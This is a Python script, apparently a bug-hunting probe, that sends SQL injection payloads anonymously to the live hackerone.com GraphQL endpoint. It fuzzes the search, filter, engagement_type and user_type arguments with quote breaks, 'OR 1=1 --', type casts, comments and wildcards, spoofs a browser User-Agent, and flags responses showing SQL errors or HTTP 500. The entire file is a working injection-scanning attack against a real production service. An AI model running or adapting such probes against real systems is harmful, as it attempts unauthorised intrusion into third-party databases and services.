# -*- coding: utf-8 -*-
"""h1x49k2c: nodes 级注入判别——search 参数走 LIKE 验证 + LB 注入矩阵(匿名)"""
import sys, io, json, time
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36'})
Q = chr(39)

def probe(name, qstr, timeout=25):
    t0 = time.time()
    try:
        r = s.post('https://hackerone.com/graphql', json={'query': qstr}, timeout=timeout)
        dt = round(time.time() - t0, 1)
        body = r.text.replace('\n', ' ')[:400]
        flag = ''
        low = r.text.lower()
        if 'syntax error' in low or 'invalid input' in low or 'does not exist' in low:
            flag = ' <<<SQL-SIG'
        elif r.status_code == 500:
            flag = ' <<<500'
        print(f'--- {name} [{r.status_code} {dt}s]{flag} {body}')
    except Exception as e:
        print(f'--- {name} ERR {type(e).__name__}: {e}')
    time.sleep(0.8)

def jdump(v):
    return json.dumps(v, ensure_ascii=False)

# ===== 1. cwe_entries nodes 级(search 走 LIKE?) =====
probe('CWE_all', '{ cwe_entries(first: 3) { nodes { id } } }')
for v in ['x', 'zzz_nonexistent', '%', '_', 'a_b', 'sql', '%sql%', 'sql%', '%a', '[ab]',
          Q, 'x' + Q, Q + ' OR 1=1 --', "x'::int", 'x--', 'x\\']:
    probe('CWE_n ' + repr(v)[:18], '{ cwe_entries(search: %s, first: 3) { nodes { id } } }' % jdump(v))

# ===== 2. ranked_cve_entries nodes 级 =====
for v in ['heartbleed', 'zzz_nonexistent', '%', '_', Q, Q + ' OR 1=1 --', "x'::int", 'x--']:
    probe('RCE_n ' + repr(v)[:18], '{ ranked_cve_entries(search: %s, first: 1) { nodes { id } } }' % jdump(v))

# ===== 3. leaderboard_entries(key: ALL_TIME_REPUTATION 有效枚举) =====
probe('LB_base', '{ leaderboard_entries(key: ALL_TIME_REPUTATION, first: 1) { total_count nodes { __typename } } }')
INJ = ['x', Q, 'x' + Q, Q + ' OR 1=1 --', 'x--', "1'::int--", '%', '*', 'x/**/', "x'||'y",
       'E' + Q + chr(92) + 'x27', 'x\tOR\ty', 'x%0aOR%0a1=1', 'x\\']
for v in INJ:
    probe('LB_f ' + repr(v)[:20], '{ leaderboard_entries(key: ALL_TIME_REPUTATION, filter: %s, first: 1) { total_count } }' % jdump(v))
for v in ['x', Q, Q + ' OR 1=1 --', 'x--', "x'::int"]:
    probe('LB_e ' + repr(v)[:14], '{ leaderboard_entries(key: ALL_TIME_REPUTATION, engagement_type: %s, first: 1) { total_count } }' % jdump(v))
    probe('LB_u ' + repr(v)[:14], '{ leaderboard_entries(key: ALL_TIME_REPUTATION, user_type: %s, first: 1) { total_count } }' % jdump(v))
